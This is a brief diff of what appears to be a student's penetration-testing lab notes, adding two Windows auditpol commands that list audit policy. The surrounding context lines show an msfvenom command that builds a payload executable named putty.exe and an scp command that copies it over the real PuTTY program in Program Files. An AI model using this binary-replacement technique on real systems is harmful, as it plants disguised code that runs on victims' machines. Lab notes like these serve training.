@@ -563,6 +563,8 @@ s.close()
 * msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe  > putty.exe
 *  scp student@10.50.37.248:/home/student/putty.exe "C:\Program Files (X86)\Putty\putty.exe"
 
+* auditpol /get /category:*
+* auditpol /get /category:* | findstr /i "success failure"
 
 
 
